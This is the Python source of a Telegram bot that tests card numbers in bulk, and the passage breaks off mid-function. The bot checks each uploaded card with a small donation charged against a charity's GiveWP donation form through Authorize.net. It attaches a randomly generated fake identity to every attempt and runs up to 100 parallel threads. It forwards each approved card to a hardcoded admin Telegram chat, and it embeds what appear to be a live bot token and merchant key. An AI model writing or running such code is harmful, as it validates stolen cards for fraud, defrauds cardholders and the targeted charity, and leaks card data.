#!/usr/bin/env python3
"""
Donation Card Checker — Multi-User Telegram Bot
- Live status panel (updates in place)
- Admin receives APPROVED only, as direct messages
- Per-card identity, real gateway messages
"""
import os
import sys
import re
import json
import time
import random
import uuid
import threading
import asyncio
import traceback
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)
from telegram.constants import ParseMode

# ======================= CONFIG =======================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8745017792:AAEaIEwRtdn2By8JhYYz-cTXmLOV1tFatcw").strip()
ADMIN_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "6207431030").strip()

BASE_OUTPUT_DIR = os.getenv("OUTPUT_DIR", "./output")
os.makedirs(BASE_OUTPUT_DIR, exist_ok=True)

DEFAULT_SITE_URL = os.getenv("DEFAULT_SITE_URL", "https://reachsoberliving.org")
DEFAULT_FORM_ID = os.getenv("DEFAULT_FORM_ID", "347")
DEFAULT_AMOUNT = os.getenv("DEFAULT_AMOUNT", "10.00")
DEFAULT_CURRENCY = os.getenv("DEFAULT_CURRENCY", "USD")
DEFAULT_M_NAME = os.getenv("DEFAULT_M_NAME", "7zJ2Ef75sqgw")
DEFAULT_CLIENT_KEY = os.getenv(
    "DEFAULT_CLIENT_KEY",
    "7xnmj72qMAELzYUt6F6W8zPJnM95yS2rB9KK7p36UcA876327VfcQSQmFmngnTGa"
)

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")

BASE_HEADERS = {
    "User-Agent": UA,
    "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": '"Android"',
}


def log(*a):
    print(f"[{datetime.now().strftime('%H:%M:%S')}]", *a, flush=True)


# ======================= RANDOM IDENTITY =======================
FIRST_NAMES = [
    "James", "Michael", "Robert", "John", "David", "William", "Richard",
    "Joseph", "Thomas", "Charles", "Christopher", "Daniel", "Matthew",
    "Anthony", "Mark", "Donald", "Steven", "Paul", "Andrew", "Joshua",
    "Emily", "Sarah", "Jessica", "Ashley", "Amanda", "Melissa", "Nicole",
    "Stephanie", "Elizabeth", "Jennifer", "Linda", "Barbara", "Susan",
    "Margaret", "Karen", "Nancy", "Lisa", "Betty", "Sandra", "Helen",
    "Kevin", "Brian", "Edward", "Ronald", "Timothy", "Jason", "Jeffrey",
    "Ryan", "Jacob", "Gary", "Nicholas", "Eric", "Jonathan", "Stephen",
]

LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
    "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez",
    "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
    "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark",
    "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King",
    "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green",
    "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell",
    "Carter", "Roberts", "Phillips", "Evans", "Turner", "Parker", "Collins",
]

EMAIL_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com",
    "aol.com", "protonmail.com", "mail.com", "gmx.com", "live.com",
]

AREA_CODES = [
    "212", "305", "312", "404", "415", "617", "702", "713", "801", "901",
    "202", "206", "214", "303", "310", "314", "407", "469", "512", "571",
    "602", "615", "619", "646", "703", "704", "720", "757", "786", "904",
]


def random_identity():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    domain = random.choice(EMAIL_DOMAINS)
    style = random.randint(1, 4)
    num = random.randint(1, 9999)
    if style == 1:
        local = f"{first.lower()}{last.lower()}{num}"
    elif style == 2:
        local = f"{first.lower()}.{last.lower()}{num}"
    elif style == 3:
        local = f"{first.lower()}{last.lower()[0]}{num}"
    else:
        local = f"{first.lower()}.{last.lower()}{random.randint(10, 99)}"
    email = f"{local}@{domain}"
    area = random.choice(AREA_CODES)
    nxx = random.randint(200, 999)
    xxxx = random.randint(1000, 9999)
    phone = f"+1{area}{nxx}{xxxx}"
    return {"first_name": first, "last_name": last, "email": email, "phone": phone}


# ======================= CHECKER CORE =======================
def safe_json(text):
    if text is None:
        return {}
    if isinstance(text, bytes):
        text = text.decode("utf-8", errors="ignore")
    text = text.lstrip("\ufeff").strip()
    try:
        return json.loads(text)
    except Exception:
        return {}


def get_form_context(site_url, form_id):
    session = requests.Session()
    session.headers.update(BASE_HEADERS)
    view_url = f"{site_url}/?givewp-route=donation-form-view&form-id={form_id}&locale=en_US"
    r = session.get(view_url, timeout=20)
    r.raise_for_status()
    html = r.text

    sig = None
    exp = None
    m = re.search(r'givewp-route-signature"\s*:\s*"([a-f0-9]+)"', html)
    if m:
        sig = m.group(1)
    m = re.search(r'givewp-route-signature-expiration"\s*:\s*"?(\d+)"?', html)
    if m:
        exp = m.group(1)
    if not sig:
        m = re.search(r'givewp-route-signature=([a-f0-9]+)', html)
        if m:
            sig = m.group(1)
    if not exp:
        m = re.search(r'givewp-route-signature-expiration=(\d+)', html)
        if m:
            exp = m.group(1)
    if not sig or not exp:
        raise Exception("could not extract givewp signature")
    return {"session": session, "signature": sig, "expiration": exp}


def tokenize_card(card_number, exp_mmyy, cvv, m_name, client_key, site_url):
    headers = {
        "Accept": "*/*",
        "Accept-Language": BASE_HEADERS["Accept-Language"],
        "Connection": "keep-alive",
        "Content-Type": "application/json; charset=UTF-8",
        "Origin": site_url,
        "Referer": site_url + "/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": UA,
        "sec-ch-ua": BASE_HEADERS["sec-ch-ua"],
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }
    json_data = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {"name": m_name, "clientKey": client_key},
            "data": {
                "type": "TOKEN",
                "id": str(uuid.uuid4()),
                "token": {
                    "cardNumber": card_number,
                    "expirationDate": exp_mmyy,
                    "cardCode": cvv,
                },
            },
        }
    }
    r = requests.post(
        "https://api2.authorize.net/xml/v1/request.api",
        headers=headers, json=json_data, timeout=20,
    )
    js = safe_json(r.text)
    opaque = js.get("opaqueData") or {}
    data_value = opaque.get("dataValue")
    data_descriptor = opaque.get("dataDescriptor", "COMMON.ACCEPT.INAPP.PAYMENT")
    if not data_value:
        return None, None, js
    return data_value, data_descriptor, js


def donate(session_cfg, card_number, card_exp_mmyy, card_cvv):
    site_url = session_cfg["site_url"]
    form_id = session_cfg["form_id"]

    ctx = get_form_context(site_url, form_id)
    session = ctx["session"]

    data_value, data_descriptor, tok_resp = tokenize_card(
        card_number, card_exp_mmyy, card_cvv,
        session_cfg["m_name"], session_cfg["client_key"], site_url
    )
    if not data_value:
        return {"ok": False, "stage": "tokenize", "response": tok_resp}

    params = {
        "givewp-route": "donate",
        "givewp-route-signature": ctx["signature"],
        "givewp-route-signature-id": "givewp-donate",
        "givewp-route-signature-expiration": ctx["expiration"],
    }

    boundary = "----WebKitFormBoundary" + "".join(
        random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=16)
    )

    ident = session_cfg.get("identity") or {
        "first_name": "John", "last_name": "Doe",
        "phone": "+15555551234", "email": "john.doe1234@gmail.com",
    }

    fields = {
        "amount": str(session_cfg["amount"]),
        "currency": session_cfg["currency"],
        "levelId": "custom",
        "donationType": "single",
        "subscriptionPeriod": "one-time",
        "subscriptionFrequency": "1",
        "subscriptionInstallments": "0",
        "formId": str(form_id),
        "gatewayId": "authorize",
        "firstName": ident["first_name"],
        "lastName": ident["last_name"],
        "phone": ident["phone"],
        "email": ident["email"],
        "donationBirthday": "",
        "originUrl": site_url + "/give/",
        "isEmbed": "true",
        "embedId": "give-form-shortcode-1",
        "locale": "en_US",
        "authToken": "",
        "gatewayData[give_authorize_data_descriptor]": data_descriptor,
        "gatewayData[give_authorize_data_value]": data_value,
    }

    body = bytearray()
    for name, value in fields.items():
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
        body += f"{value}\r\n".encode()
    body += f"--{boundary}--\r\n".encode()

    donate_headers = {
        "authority": urlparse(site_url).netloc,
        "accept": "application/json",
        "accept-language": BASE_HEADERS["Accept-Language"],
        "content-type": f"multipart/form-data; boundary={boundary}",
        "origin": site_url,
        "referer": f"{site_url}/?givewp-route=donation-form-view&form-id={form_id}&locale=en_US",
        "sec-ch-ua": BASE_HEADERS["sec-ch-ua"],
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": UA,
    }

    r2 = session.post(
        site_url + "/", params=params, headers=donate_headers,
        data=bytes(body), timeout=30,
    )

    donate_json = safe_json(r2.text)
    return {
        "ok": r2.status_code == 200,
        "stage": "donate",
        "status": r2.status_code,
        "response": donate_json if donate_json else {"_raw": r2.text},
        "raw": r2.text,
    }


def extract_error(result):
    """gateway_error first, else raw body — exactly like standalone."""
    resp = result.get("response") or {}
    if not isinstance(resp, dict):
        resp = {}

    try:
        msg = resp["data"]["errors"]["errors"]["gateway_error"][0]
        msg = msg.split("] ", 1)[-1] if "] " in msg else msg
        return msg
    except (KeyError, IndexError, TypeError):
        pass

    if result.get("raw"):
        return result["raw"][:300]

    return "Unknown error"


def classify(result):
    """APPROVED only when gateway_error says approved OR success==True."""
    resp = result.get("response") or {}
    if not isinstance(resp, dict):
        resp = {}

    # Case 1: gateway_error
    try:
        raw_msg = resp["data"]["errors"]["errors"]["gateway_error"][0]
        msg = raw_msg.split("] ", 1)[-1] if "] " in raw_msg else raw_msg
        ml = msg.lower()
        if "approved" in ml or "successful" in ml or "thank you" in ml:
            return "APPROVED"
        return "DECLINED"
    except (KeyError, IndexError, TypeError):
        pass

    # Case 2: success boolean
    if result.get("ok") and resp.get("success") is True:
        return "APPROVED"

    # Case 3: everything else
    return "DECLINED"


def parse_card_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    if "|" in line:
        parts = [p.strip() for p in line.split("|")]
    elif " " in line and line.count(" ") >= 3:
        parts = [p.strip() for p in line.split()]
    else:
        return None
    if len(parts) < 4:
        return None
    cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    cc_num = re.sub(r"\D", "", cc_num)
    mm = re.sub(r"\D", "", mm)
    yy = re.sub(r"\D", "", yy)
    cvv = re.sub(r"\D", "", cvv)
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:]
    if len(cc_num) < 13 or not mm or not yy or not cvv:
        return None
    return {"raw": f"{cc_num}|{mm}|{yy}|{cvv}", "num": cc_num, "mm": mm, "yy": yy, "cvv": cvv}


def check_card_worker(session_cfg, card):
    try:
        ident = random_identity()
        cfg = dict(session_cfg)
        cfg["identity"] = ident

        result = donate(cfg, card["num"], f"{card['mm']}{card['yy']}", card["cvv"])
        status = classify(result)
        msg = extract_error(result)

        if result.get("stage") == "tokenize":
            msg = f"Tokenize failed: {msg}"

        return {
            "card": card["raw"],
            "status": status,
            "message": msg,
            "identity": ident,
            "raw_stage": result.get("stage", "?"),
            "http_status": result.get("status", "?"),
        }
    except Exception as e:
        return {
            "card": card["raw"],
            "status": "ERROR",
            "message": f"{type(e).__name__}: {e}",
            "identity": {"first_name": "-", "last_name": "-", "email": "-", "phone": "-"},
            "raw_stage": "exception",
            "http_status": "?",
        }


# ======================= SESSION =======================
class UserSession:
    def __init__(self, chat_id):
        self.chat_id = chat_id
        self.running = False
        self.stop_flag = False
        self.threads = 10
        self.delay = 0.3
        self.total = 0
        self.processed = 0
        self.approved = 0
        self.declined = 0
        self.errors = 0
        self.cards = []
        self.card_filename = None
        self.start_time = None
        self.live_approved = []
        self.lock = threading.Lock()
        self.awaiting_file = False
        self.output_dir = os.path.join(BASE_OUTPUT_DIR, str(chat_id))
        os.makedirs(self.output_dir, exist_ok=True)
        self.cfg = {
            "site_url": DEFAULT_SITE_URL,
            "form_id": DEFAULT_FORM_ID,
            "amount": DEFAULT_AMOUNT,
            "currency": DEFAULT_CURRENCY,
            "m_name": DEFAULT_M_NAME,
            "client_key": DEFAULT_CLIENT_KEY,
        }

    def file(self, name):
        return os.path.join(self.output_dir, name)

    def reset_results(self):
        with self.lock:
            self.live_approved.clear()
            self.approved = self.declined = self.errors = 0
            self.processed = 0
        for f in ("approved.txt", "declined.txt", "errors.txt"):
            try: os.remove(self.file(f))
            except Exception: pass


SESSIONS = {}
SESSIONS_LOCK = threading.Lock()


def get_session(chat_id):
    with SESSIONS_LOCK:
        if chat_id not in SESSIONS:
            SESSIONS[chat_id] = UserSession(chat_id)
        return SESSIONS[chat_id]


def is_admin(chat_id):
    if not ADMIN_CHAT_ID:
        return False
    return str(chat_id) == str(ADMIN_CHAT_ID)


def process_one(session, card, loop, bot):
    if session.stop_flag:
        return "STOPPED"

    r = check_card_worker(session.cfg, card)
    status = r["status"]
    ident = r.get("identity") or {}

    with session.lock:
        session.processed += 1
        if status == "APPROVED":
            session.approved += 1
            session.live_approved.append((
                r["card"],
                ident.get("first_name", "-"),
                ident.get("last_name", "-"),
                ident.get("email", "-"),
                ident.get("phone", "-"),
            ))
        elif status == "DECLINED":
            session.declined += 1
        else:
            session.errors += 1

    # User sees every card result
    emoji = "✅" if status == "APPROVED" else ("❌" if status == "DECLINED" else "⚠️")
    user_msg = (
        f"{emoji} <b>{status}</b>\n"
        f"💳 <code>{r['card']}</code>\n"
        f"👤 {ident.get('first_name','-')} {ident.get('last_name','-')}\n"
        f"📧 <code>{ident.get('email','-')}</code>\n"
        f"📱 {ident.get('phone','-')}\n"
        f"<b>stage:</b> {r.get('raw_stage','?')} | <b>http:</b> {r.get('http_status','?')}\n"
        f"<i>{r['message'][:300]}</i>"
    )
    asyncio.run_coroutine_threadsafe(_safe_send(bot, session.chat_id, user_msg), loop)

    # Admin gets APPROVED only — direct, clean message
    if status == "APPROVED" and ADMIN_CHAT_ID:
        admin_msg = (
            f"<b>✅ APPROVED</b>\n"
            f"💳 <code>{r['card']}</code>\n"
            f"👤 {ident.get('first_name','-')} {ident.get('last_name','-')}\n"
            f"📧 <code>{ident.get('email','-')}</code>\n"
            f"📱 {ident.get('phone','-')}\n"
            f"👤 From: <code>{session.chat_id}</code>"
        )
        asyncio.run_coroutine_threadsafe(_safe_send(bot, ADMIN_CHAT_ID, admin_msg), loop)

    time.sleep(session.delay)
    return status


async def _safe_send(bot, chat_id, text):
    try:
        await bot.send_message(chat_id=chat_id, text=text,
                               parse_mode=ParseMode.HTML,
                               disable_web_page_preview=True)
    except Exception as e:
        log("[send error]", chat_id, e)


# ======================= KEYBOARDS =======================
def kb_main(session):
    rows = []
    if session.cards:
        rows.append([InlineKeyboardButton(
            f"💳 File loaded: {session.total} cards", callback_data="noop")])
        rows.append([
            InlineKeyboardButton("▶️ Start Check", callback_data="menu_start"),
            InlineKeyboardButton("🔄 Replace File", callback_data="menu_send"),
        ])
    else:
        rows.append([InlineKeyboardButton("📤 Send Card File", callback_data="menu_send")])
    rows.append([
        InlineKeyboardButton("📡 Live Panel", callback_data="menu_live"),
        InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
    ])
    rows.append([
        InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings"),
        InlineKeyboardButton("🛒 Site Config", callback_data="menu_cfg"),
    ])
    rows.append([
        InlineKeyboardButton("📁 My Results", callback_data="menu_results"),
        InlineKeyboardButton("🗑 Clear", callback_data="menu_clear"),
    ])
    if session.running:
        rows.append([InlineKeyboardButton("⏹ Stop", callback_data="menu_stop")])
    rows.append([InlineKeyboardButton("ℹ️ Help", callback_data="menu_help")])
    return InlineKeyboardMarkup(rows)


def kb_after_upload(session):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"✅ Confirm & Start — {session.total} cards",
                              callback_data="menu_start")],
        [InlineKeyboardButton("🔄 Upload Different File", callback_data="menu_send")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_back")],
    ])


def kb_waiting_file():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="menu_back")]])


def kb_settings(session):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("➖ Thr", callback_data="set_thr_minus"),
            InlineKeyboardButton(f"🧵 {session.threads}", callback_data="noop"),
            InlineKeyboardButton("➕ Thr", callback_data="set_thr_plus"),
        ],
        [
            InlineKeyboardButton("➖ Dly", callback_data="set_dly_minus"),
            InlineKeyboardButton(f"⏱ {session.delay:.1f}s", callback_data="noop"),
            InlineKeyboardButton("➕ Dly", callback_data="set_dly_plus"),
        ],
        [InlineKeyboardButton("⬅️ Back", callback_data="menu_back")],
    ])


def kb_results():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Approved", callback_data="res_approved")],
        [InlineKeyboardButton("❌ Declined", callback_data="res_declined")],
        [InlineKeyboardButton("⚠️ Errors", callback_data="res_errors")],
        [InlineKeyboardButton("📦 Send All Files", callback_data="res_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="menu_back")],
    ])


def kb_cfg(session):
    c = session.cfg
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"🛒 {c['site_url'][:45]}", callback_data="cfg_site")],
        [InlineKeyboardButton(f"🆔 Form: {c['form_id']}", callback_data="cfg_form")],
        [InlineKeyboardButton(f"💰 {c['amount']} {c['currency']}", callback_data="cfg_amount")],
        [InlineKeyboardButton("⬅️ Back", callback_data="menu_back")],
    ])


def live_status_text(session):
    """Compact live panel with counts and progress bar."""
    elapsed = int(time.time() - session.start_time) if session.start_time else 0
    pct = int((session.processed / session.total) * 100) if session.total else 0
    bar_len = 16
    filled = int(bar_len * pct / 100)
    bar = "█" * filled + "░" * (bar_len - filled)

    status_word = "🟢 RUNNING" if session.running else "⚪ IDLE"

    return (
        f"<b>💳 LIVE CHECK STATUS</b>\n"
        f"{status_word}  •  ⏱ <b>{elapsed}s</b>\n"
        f"{bar} <b>{pct}%</b> ({session.processed}/{session.total})\n\n"
        f"<b>✅ APPROVED:</b>  <b>{session.approved}</b>\n"
        f"<b>❌ DECLINED:</b>  <b>{session.declined}</b>\n"
        f"<b>⚠️ ERRORS:</b>    <b>{session.errors}</b>\n\n"
        f"🧵 Threads: <b>{session.threads}</b>  |  ⏱ Delay: <b>{session.delay:.1f}s</b>\n"
        f"🛒 <code>{session.cfg['site_url']}</code>"
    )


def stats_text(session):
    elapsed = int(time.time() - session.start_time) if session.start_time else 0
    return (
        f"<b>📊 My Stats</b>\n"
        f"⚡ Running: <b>{session.running}</b> | 🧵 <b>{session.threads}</b> | ⏱ <b>{session.delay:.1f}s</b>\n"
        f"💳 Total: <b>{session.total}</b> | 🔁 Done: <b>{session.processed}</b>\n"
        f"✅ Approved: <b>{session.approved}</b>\n"
        f"❌ Declined: <b>{session.declined}</b>\n"
        f"⚠️ Errors: <b>{session.errors}</b>\n"
        f"⏳ Elapsed: <b>{elapsed}s</b>"
    )


def file_summary_text(session):
    lines = [
        "<b>💳 File Confirmed</b>", "",
        f"📁 Name: <code>{session.card_filename}</code>",
        f"💳 Cards: <b>{session.total}</b>",
        f"🧵 Threads: <b>{session.threads}</b>",
        f"⏱ Delay: <b>{session.delay:.1f}s</b>",
        f"🛒 Site: <code>{session.cfg['site_url']}</code>",
        f"💰 Amount: {session.cfg['amount']} {session.cfg['currency']}",
        "", "<b>Preview (first 3):</b>",
    ]
    for i, c in enumerate(session.cards[:3]):
        num = c["num"]
        masked = num[:6] + "*" * (len(num) - 10) + num[-4:]
        lines.append(f"{i+1}. <code>{masked}|{c['mm']}/{c['yy']}|***</code>")
    if session.total > 3:
        lines.append(f"... and {session.total - 3} more")
    return "\n".join(lines)


# ======================= HANDLERS =======================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    session = get_session(chat_id)
    user = update.effective_user
    tag = " (admin)" if is_admin(chat_id) else ""
    await update.message.reply_text(
        f"<b>💳 Donation Card Checker</b>{tag}\n\n"
        f"Welcome <b>{user.first_name}</b>.\n\n"
        "1️⃣ Press <b>📤 Send Card File</b>\n"
        "2️⃣ Upload <code>.txt</code> (one per line: <code>num|mm|yy|cvv</code>)\n"
        "3️⃣ Bot confirms\n"
        "4️⃣ Press <b>▶️ Start Check</b>\n"
        "5️⃣ Watch live panel + results\n\n"
        "<i>Each card gets a fresh random identity automatically.</i>",
        parse_mode=ParseMode.HTML,
        reply_markup=kb_main(session)
    )


async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = get_session(update.effective_chat.id)
    await update.message.reply_text("🏠 <b>Main Menu</b>",
                                    parse_mode=ParseMode.HTML,
                                    reply_markup=kb_main(session))


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    session = get_session(chat_id)
    if session.running:
        await update.message.reply_text("⚠️ Check running. Stop it first.")
        return
    doc = update.message.document
    if not doc:
        return
    if not doc.file_name.lower().endswith((".txt", ".csv")):
        await update.message.reply_text(
            "❌ Only <code>.txt</code> or <code>.csv</code> accepted.",
            parse_mode=ParseMode.HTML, reply_markup=kb_waiting_file())
        return

    status_msg = await update.message.reply_text("📥 <b>Downloading file...</b>",
                                                 parse_mode=ParseMode.HTML)
    try:
        tg_file = await doc.get_file()
        path = session.file(f"cards_{int(time.time())}.txt")
        await tg_file.download_to_drive(path)

        cards = []
        skipped = 0
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                card = parse_card_line(line)
                if card:
                    cards.append(card)
                elif line.strip() and not line.strip().startswith("#"):
                    skipped += 1

        if not cards:
            await status_msg.edit_text(
                "❌ No valid cards found.\n\nFormat: <code>number|mm|yy|cvv</code>",
                parse_mode=ParseMode.HTML, reply_markup=kb_waiting_file())
            return

        session.cards = cards
        session.total = len(cards)
        session.card_filename = doc.file_name
        session.awaiting_file = False

        txt = file_summary_text(session)
        if skipped:
            txt += f"\n\n⚠️ Skipped <b>{skipped}</b> invalid lines."
        await status_msg.edit_text(txt, parse_mode=ParseMode.HTML,
                                   reply_markup=kb_after_upload(session))
    except Exception as e:
        log("doc error:", traceback.format_exc())
        await status_msg.edit_text(f"❌ <code>{e}</code>",
                                   parse_mode=ParseMode.HTML,
                                   reply_markup=kb_waiting_file())


async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try: await q.answer()
    except Exception: pass

    data = q.data or ""
    chat_id = update.effective_chat.id
    session = get_session(chat_id)
    if data == "noop":
        return

    try:
        if data == "menu_back":
            await q.edit_message_text("🏠 <b>Main Menu</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_main(session)); return

        if data == "menu_live":
            await q.edit_message_text(live_status_text(session),
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_main(session)); return

        if data == "menu_send":
            if session.running:
                await q.edit_message_text("⚠️ Check running. Stop first.",
                                          reply_markup=kb_main(session)); return
            session.awaiting_file = True
            await q.edit_message_text(
                "📤 <b>Send Card File</b>\n\n"
                "Send <code>.txt</code> or <code>.csv</code>.\n"
                "Each line: <code>number|mm|yy|cvv</code>\n\n<i>Waiting...</i>",
                parse_mode=ParseMode.HTML, reply_markup=kb_waiting_file()); return

        if data == "menu_start":
            if session.running:
                await q.edit_message_text("⚠️ Already running.",
                                          reply_markup=kb_main(session)); return
            if not session.cards:
                await q.edit_message_text("❌ No file loaded.",
                                          reply_markup=kb_main(session)); return
            asyncio.create_task(run_check(context.application, session))
            await q.edit_message_text(
                f"🚀 <b>Check Started</b>\n\n"
                f"💳 {session.total} cards\n"
                f"🧵 {session.threads} threads\n"
                f"⏱ {session.delay:.1f}s delay\n\n"
                "Live panel below will update every 3s.",
                parse_mode=ParseMode.HTML, reply_markup=kb_main(session)); return

        if data == "menu_stop":
            if not session.running:
                await q.edit_message_text("Nothing running.",
                                          reply_markup=kb_main(session)); return
            session.stop_flag = True
            await q.edit_message_text("⏹ <b>Stopping...</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_main(session)); return

        if data == "menu_stats":
            await q.edit_message_text(stats_text(session), parse_mode=ParseMode.HTML,
                                      reply_markup=kb_main(session)); return

        if data == "menu_settings":
            await q.edit_message_text("⚙️ <b>Settings</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_settings(session)); return

        if data == "menu_results":
            await q.edit_message_text("📁 <b>My Results</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_results()); return

        if data == "menu_clear":
            session.reset_results()
            await q.edit_message_text("🗑 <b>Cleared.</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_main(session)); return

        if data == "menu_cfg":
            await q.edit_message_text("🛒 <b>Site Config</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_cfg(session)); return

        if data == "menu_help":
            await q.edit_message_text(
                "<b>ℹ️ Help</b>\n\n"
                "• Format: <code>number|mm|yy|cvv</code>\n"
                "• Also: <code>number mm yy cvv</code>\n"
                "• 📡 Live Panel updates in place every 3s\n"
                "• Random identity per card\n"
                "• Change site/amount via 🛒\n"
                "• Results show real gateway message\n"
                "• Admin receives APPROVED only, as DMs",
                parse_mode=ParseMode.HTML, reply_markup=kb_main(session)); return

        if data == "set_thr_plus":
            session.threads = min(session.threads + 5, 100)
            await q.edit_message_text("⚙️ <b>Settings</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_settings(session)); return
        if data == "set_thr_minus":
            session.threads = max(session.threads - 5, 1)
            await q.edit_message_text("⚙️ <b>Settings</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_settings(session)); return
        if data == "set_dly_plus":
            session.delay = round(session.delay + 0.1, 1)
            await q.edit_message_text("⚙️ <b>Settings</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_settings(session)); return
        if data == "set_dly_minus":
            session.delay = max(round(session.delay - 0.1, 1), 0.0)
            await q.edit_message_text("⚙️ <b>Settings</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_settings(session)); return

        if data in ("cfg_site", "cfg_form", "cfg_amount"):
            field = {"cfg_site": "site_url", "cfg_form": "form_id", "cfg_amount": "amount"}[data]
            context.user_data["await_cfg"] = field
            await q.edit_message_text(
                f"✏️ Send the new value for <b>{field}</b>\n"
                f"Current: <code>{session.cfg[field]}</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("❌ Cancel", callback_data="menu_cfg")
                ]])); return

        if data.startswith("res_"):
            kind = data[4:]
            if kind == "all":
                sent = 0
                for name, cap in [("approved.txt", "Approved"),
                                  ("declined.txt", "Declined"),
                                  ("errors.txt", "Errors")]:
                    p = session.file(name)
                    if os.path.exists(p) and os.path.getsize(p) > 0:
                        with open(p, "rb") as f:
                            await context.bot.send_document(chat_id, f, caption=cap)
                        sent += 1
                if sent == 0:
                    await context.bot.send_message(chat_id, "📭 No files yet.")
                return
            p = session.file(f"{kind}.txt")
            if not os.path.exists(p) or os.path.getsize(p) == 0:
                await context.bot.send_message(chat_id, f"📭 No {kind} results.")
                return
            with open(p, "rb") as f:
                await context.bot.send_document(chat_id, f, caption=kind.title())
            return

    except Exception as e:
        log("callback error:", traceback.format_exc())
        try:
            await context.bot.send_message(chat_id, f"⚠️ Error: <code>{e}</code>",
                                           parse_mode=ParseMode.HTML)
        except Exception:
            pass


async def handle_text_cfg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    session = get_session(chat_id)
    field = context.user_data.get("await_cfg")
    if not field:
        return
    val = (update.message.text or "").strip()
    if not val:
        return
    if field == "site_url" and not val.startswith("http"):
        await update.message.reply_text("❌ URL must start with http")
        return
    session.cfg[field] = val
    context.user_data["await_cfg"] = None
    await update.message.reply_text(
        f"✅ Updated <b>{field}</b> = <code>{val}</code>",
        parse_mode=ParseMode.HTML, reply_markup=kb_cfg(session))


# ======================= RUN =======================
async def run_check(app: Application, session: UserSession):
    if session.running:
        return
    session.running = True
    session.stop_flag = False
    session.start_time = time.time()

    chat_id = session.chat_id
    bot = app.bot
    loop = asyncio.get_running_loop()

    # Single panel message — edited in place every 3s
    panel = await bot.send_message(
        chat_id,
        live_status_text(session),
        parse_mode=ParseMode.HTML
    )

    async def progress_loop():
        try:
            while session.running:
                await asyncio.sleep(3)
                try:
                    await panel.edit_text(
                        live_status_text(session),
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass
        except asyncio.CancelledError:
            pass

    progress_task = asyncio.create_task(progress_loop())

    def run_pool():
        with ThreadPoolExecutor(max_workers=session.threads) as ex:
            futures = [ex.submit(process_one, session, c, loop, bot)
                       for c in session.cards]
            for _ in as_completed(futures):
                if session.stop_flag:
                    break

    await loop.run_in_executor(None, run_pool)

    session.running = False
    progress_task.cancel()

    # write files
    with open(session.file("approved.txt"), "w", encoding="utf-8") as f:
        for row in session.live_approved:
            f.write(" | ".join(str(x) for x in row) + "\n")
    with open(session.file("declined.txt"), "w", encoding="utf-8") as f:
